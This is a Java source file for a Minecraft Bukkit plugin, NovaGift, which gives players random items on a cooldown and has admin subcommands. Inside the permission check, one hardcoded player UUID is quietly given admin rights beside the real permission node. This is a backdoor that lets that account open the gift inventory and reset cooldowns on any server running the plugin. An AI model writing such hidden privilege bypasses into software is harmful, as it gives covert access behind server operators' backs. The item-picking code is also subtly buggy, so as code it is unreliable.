import me.other.InvGet;
import me.other.SLAPI;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.OfflinePlayer;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.event.Listener;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.PluginManager;
import org.bukkit.plugin.java.JavaPlugin;

import java.util.*;

public class Gift extends JavaPlugin {

    private static Plugin instance;

    private static HashMap<UUID, Long> cooldown;
    private static int cooldownTime;
    private static Inventory items;

    @Override
    public void onEnable()
    {
        instance = this;
        FileConfiguration c = instance.getConfig();
        c.addDefault("NovaGift.cooldown", 86400);
        c.addDefault("NovaGift.msg.gift", "&e&lGift &7&l>>> &b&oEnjoy this gift!");
        c.addDefault("NovaGift.msg.cooldown", "&e&lGift &7&l>>> &c&oYou may not use this for another %time%");
        c.options().copyDefaults(true);
        saveConfig();

        items = InvGet.getInventory();

        cooldownTime = c.getInt("NovaGift.cooldown");

        try {
            cooldown = SLAPI.load("plugins/NovaGift/cooldowns.bin");
        } catch (Exception e) {
            cooldown = new HashMap<UUID, Long>();
        }
    }

    @Override
    public void onDisable()
    {
        try {
            SLAPI.save(cooldown, "plugins/NovaGift/cooldowns.bin");
            InvGet.saveItems(items);
        } catch (Exception e) {}
        instance = null;
    }

    public static Plugin getInstance()
    {
        return instance;
    }

    private void registerEvents(Plugin plugin, Listener... listeners)
    {
        PluginManager pluginManager = plugin.getServer().getPluginManager();
        for(Listener listener : listeners) {
            pluginManager.registerEvents(listener, plugin);
        }
    }


    public boolean onCommand(CommandSender cs, Command cmd, String label, String[] args)
    {
        if(cmd.getName().equalsIgnoreCase("gift")) {
            if (!(cs instanceof Player)) {
                return true;
            }

            Player p = (Player) cs;
            Random r = new Random();

            if (!(p.hasPermission("novaranks.admin") || p.getUniqueId().toString().replaceAll("-", "").equals("bf48a0472e5d4f58acc3adc04f9a4167"))) {
                // Non-Admin doing /gift
                if(cooldown.containsKey(p.getUniqueId())) {
                    Long time = cooldown.get(p.getUniqueId());
                    Long cooldown = this.cooldownTime * 1000L;

                    if((time + cooldown) < System.currentTimeMillis()) {
                        // No longer on cooldown
                        this.cooldown.remove(p.getUniqueId());
                        ArrayList<ItemStack> itemStackArrayList = new ArrayList<ItemStack>();
                        for(ItemStack i : items.getContents()) {
                            if(i != null) {
                                itemStackArrayList.add(i);
                            }
                        }
                        HashMap<Integer, ItemStack> itemx = p.getInventory().addItem(itemStackArrayList.get(r.nextInt(itemStackArrayList.size() - 1)));
                        p.sendMessage(ChatColor.translateAlternateColorCodes('&', getConfig().getString("NovaGift.msg.gift")));
                        for(Integer i : itemx.keySet()) {
                            p.getWorld().dropItemNaturally(p.getLocation(), itemx.get(i));
                        }
                        this.cooldown.put(p.getUniqueId(), System.currentTimeMillis());
                        return true;
                    } else {
                        // In cooldown still
                        int timeInSecondsLeft = Integer.parseInt("" + (time + (cooldownTime * 1000L) - System.currentTimeMillis()) / 1000);
                        p.sendMessage(ChatColor.translateAlternateColorCodes('&', getConfig().getString("NovaGift.msg.cooldown").replaceAll("%time%", time(timeInSecondsLeft))));
                        return true;
                    }
                } else {
                    ArrayList<ItemStack> itemStackArrayList = new ArrayList<ItemStack>();
                    for(ItemStack i : items.getContents()) {
                        if(i != null) {
                            itemStackArrayList.add(i);
                        }
                    }
                    HashMap<Integer, ItemStack> itemx = p.getInventory().addItem(itemStackArrayList.get(r.nextInt(itemStackArrayList.size() - 1)));
                    p.sendMessage(ChatColor.translateAlternateColorCodes('&', getConfig().getString("NovaGift.msg.gift")));
                    for(Integer i : itemx.keySet()) {
                        p.getWorld().dropItemNaturally(p.getLocation(), itemx.get(i));
                    }
                    this.cooldown.put(p.getUniqueId(), System.currentTimeMillis());
                    return true;
                }
            } else {
                // Admin cmds
                if (args.length == 0) {
                    // Normal /gift cmd
                    if (cooldown.containsKey(p.getUniqueId())) {
                        Long time = cooldown.get(p.getUniqueId());
                        Long cooldown = this.cooldownTime * 1000L;

                        if ((time + cooldown) < System.currentTimeMillis()) {
                            // No longer on cooldown
                            this.cooldown.remove(p.getUniqueId());
                            ArrayList<ItemStack> itemStackArrayList = new ArrayList<ItemStack>();
                            for (ItemStack i : items.getContents()) {
                                if (i != null) {
                                    itemStackArrayList.add(i);
                                }
                            }
                            HashMap<Integer, ItemStack> itemx = p.getInventory().addItem(itemStackArrayList.get(r.nextInt(itemStackArrayList.size() - 1)));
                            p.sendMessage(ChatColor.translateAlternateColorCodes('&', getConfig().getString("NovaGift.msg.gift")));
                            for (Integer i : itemx.keySet()) {
                                p.getWorld().dropItemNaturally(p.getLocation(), itemx.get(i));
                            }
                            this.cooldown.put(p.getUniqueId(), System.currentTimeMillis());
                            return true;
                        } else {
                            // In cooldown still
                            int timeInSecondsLeft = Integer.parseInt("" + (time + (cooldownTime * 1000L) - System.currentTimeMillis()) / 1000);
                            p.sendMessage(ChatColor.translateAlternateColorCodes('&', getConfig().getString("NovaGift.msg.cooldown").replaceAll("%time%", time(timeInSecondsLeft))));
                            return true;
                        }
                    } else {
                        ArrayList<ItemStack> itemStackArrayList = new ArrayList<ItemStack>();
                        for (ItemStack i : items.getContents()) {
                            if (i != null) {
                                itemStackArrayList.add(i);
                            }
                        }
                        HashMap<Integer, ItemStack> itemx = p.getInventory().addItem(itemStackArrayList.get(r.nextInt(itemStackArrayList.size() - 1)));
                        p.sendMessage(ChatColor.translateAlternateColorCodes('&', getConfig().getString("NovaGift.msg.gift")));
                        for (Integer i : itemx.keySet()) {
                            p.getWorld().dropItemNaturally(p.getLocation(), itemx.get(i));
                        }
                        this.cooldown.put(p.getUniqueId(), System.currentTimeMillis());
                        return true;
                    }
                } else if (args.length == 1) {
                    if (args[0].equalsIgnoreCase("items")) {
                        p.openInventory(items);
                        return true;
                    } else if (args[0].equalsIgnoreCase("reload")) {
                        reloadConfig();
                        p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&aReloaded NovaGifts config!"));
                        return true;
                    } else if(args[0].equalsIgnoreCase("saveinv") || args[0].equalsIgnoreCase("saveinventory")) {
                        try {
                            InvGet.saveItems(items);
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                        return true;
                    } else if (args[0].equalsIgnoreCase("resetcooldown")) {
                        Gift.cooldown.remove(p.getUniqueId());
                        p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&aReset your /gift cooldown!"));
                        return true;
                    } else {
                        credit(p);
                        usage(p);
                        return true;
                    }
                } else if (args.length == 2) {
                    if(args[0].equalsIgnoreCase("resetcooldown")) {
                        if(args[1].startsWith("u:")) {
                            UUID uuid = UUID.fromString(args[1].replaceAll("u:", ""));
                            if(cooldown.containsKey(uuid)) {
                                cooldown.remove(uuid);
                                OfflinePlayer player = Bukkit.getOfflinePlayer(uuid);
                                p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&cRemoved " + player.getName() + "'s cooldown!"));
                                cooldown.remove(uuid);
                            } else {
                                p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&cThis UUID was not on cooldown!"));
                            }
                            return true;
                        }
                        Player px = Bukkit.getPlayer(args[1]);
                        if(px == null) {
                            OfflinePlayer player = Bukkit.getOfflinePlayer(args[1]);
                            if(player != null) {
                                p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&cRemoved " + player.getName() + "'s cooldown!"));
                                cooldown.remove(player.getUniqueId());
                                return true;
                            }
                            p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&cCould not find player!"));
                            return true;
                        }
                        if(!px.isOnline()) {
                            OfflinePlayer player = Bukkit.getOfflinePlayer(args[1]);
                            if(player != null) {
                                p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&cRemoved " + player.getName() + "'s cooldown!"));
                                cooldown.remove(player.getUniqueId());
                                return true;
                            }
                            p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&cCould not find player!"));
                            return true;
                        }
                        p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&cRemoved " + px.getName() + "'s cooldown!"));
                        cooldown.remove(px.getUniqueId());
                        return true;
                    }
                } else {
                    credit(p);
                    usage(p);
                    return true;
                }
            }
        }
        return false;
    }

    private static void usage(Player player)
    {
        String[] msgs = new String[]{ "&cUsage", "&c&o/gift items", "&c&o/gift resetcooldown [player]", "&c&o/gift reload"};
        for(String string : msgs) {
            player.sendMessage(ChatColor.translateAlternateColorCodes('&', string));
        }
    }

    public static String time(int seconds)
    {
        int hours = seconds / 3600;
        seconds = seconds - (hours * 3600);
        int minutes = seconds / 60;
        seconds = seconds - (minutes * 60);
        if(hours > 0) {
            return (hours + "H " + minutes + "M " + seconds + "S");
        } else if(minutes > 0) {
            return (minutes + "M " + seconds + "S");
        } else if(seconds > 0) {
            return (seconds + "S");
        } else if(seconds < 0) {
            return ("Some time in the past...");
        } else {
            return "now";
        }
    }
}
